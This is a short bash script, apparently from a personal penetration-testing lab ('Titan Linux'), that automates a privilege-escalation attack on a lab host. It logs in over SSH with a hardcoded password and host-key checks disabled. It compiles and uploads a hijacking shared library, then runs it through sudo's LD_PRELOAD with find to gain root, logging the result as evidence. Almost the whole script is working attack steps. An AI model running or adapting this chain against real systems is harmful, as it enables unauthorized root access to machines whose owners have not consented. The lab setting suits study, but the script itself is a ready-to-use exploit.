#!/bin/bash
cd "/home/chifay/Whoami-Labs/Titan Linux" || exit 1
SSH="sshpass -p password123 ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no ubuntu@192.168.60.132"
clear
printf '\033]0;TITAN VECTOR 2 LD_PRELOAD\007'
echo "=================================================================="
echo " TITAN LINUX - VECTOR 2: LD_PRELOAD + sudo find"
echo " Fecha: $(date)"
echo "=================================================================="
echo
echo '$ sudo -l -U developer'
$SSH 'echo password123 | sudo -S -l -U developer' 2>&1 | grep -v '^\[sudo\]'
echo
echo '$ gcc -shared -fPIC -o /tmp/libhijack.so scripts/libhijack.c'
gcc -shared -fPIC -o /tmp/libhijack.so scripts/libhijack.c && echo "[+] Biblioteca compilada"
echo
echo '$ scp /tmp/libhijack.so ubuntu@192.168.60.132:/tmp/'
sshpass -p password123 scp -o StrictHostKeyChecking=no /tmp/libhijack.so ubuntu@192.168.60.132:/tmp/libhijack.so && echo "[+] Copiada al objetivo"
echo
echo '$ sudo -u developer bash -c "sudo -n LD_PRELOAD=/tmp/libhijack.so /usr/bin/find /tmp -maxdepth 0"'
$SSH 'echo password123 | sudo -S -u developer -H bash -c "sudo -n LD_PRELOAD=/tmp/libhijack.so /usr/bin/find /tmp -maxdepth 0"' 2>&1 | tee "evidencias/term_vector2_ld_preload.txt" | grep -v '^\[sudo\]'
echo
echo "### FIN ETAPA 2 ###"
touch /tmp/opencode/stage2.done
sleep 3600
